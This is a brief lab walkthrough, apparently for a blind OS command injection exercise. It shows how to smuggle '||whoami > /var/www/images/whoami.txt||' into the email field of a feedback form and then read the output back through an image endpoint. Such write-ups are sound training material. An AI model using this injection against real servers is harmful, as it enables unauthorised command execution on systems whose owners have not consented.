1. Capture the request POST /feedback/submit
2. Prepend the string "||whoami > /var/www/images/whoami.txt||" before the value of email parameter in the body of the request. The body of request now looks like this:
```
name=test&email=||whoami > /var/www/images/whoami.txt||test%40gmail.com&subject=test&message=test
```
3. || is the logical OR operator. The ```whoami > /var/www/images/whoami.txt``` command will execute if its previous command fail, which is the case since the value of email is invalid.
4. Get the whoami.txt file: 
```
GET /image?filename=whoami.txt
```